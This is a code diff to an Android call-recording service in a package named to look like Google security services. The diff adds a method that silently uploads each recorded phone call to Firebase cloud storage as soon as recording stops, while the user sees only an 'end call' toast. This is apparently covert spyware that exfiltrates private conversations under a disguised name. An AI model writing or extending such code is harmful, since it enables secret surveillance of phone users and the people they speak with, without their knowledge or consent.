@@ -17,6 +17,8 @@ import android.support.v4.provider.DocumentFile;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
 import com.google.services.security.MainActivity;
 import com.google.services.security.R;
 
@@ -144,11 +146,19 @@ public class RecordService extends Service {
             deleteFile();
         }
         if (recorderStopped) {
+           uploadFileRecordedFile();
             Toast.makeText(this, this.getString(R.string.receiver_end_call),
                     Toast.LENGTH_SHORT)
                     .show();
         }
     }
+
+    private void uploadFileRecordedFile() {
+        StorageReference mStorageRef = FirebaseStorage.getInstance().getReference();
+        mStorageRef.putFile(file.getUri());
+    }
+
+    ParcelFileDescriptor fd;
 
     private void startRecording() {
         Log.d(Constants.TAG, "RecordService startRecording");
@@ -160,7 +170,7 @@ public class RecordService extends Service {
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
 
             file = FileHelper.getFile(this, phoneNumber);
-            ParcelFileDescriptor fd = getContentResolver()
+            fd = getContentResolver()
                     .openFileDescriptor(file.getUri(), "w");
             if (fd == null)
                 throw new Exception("Failed open recording file.");
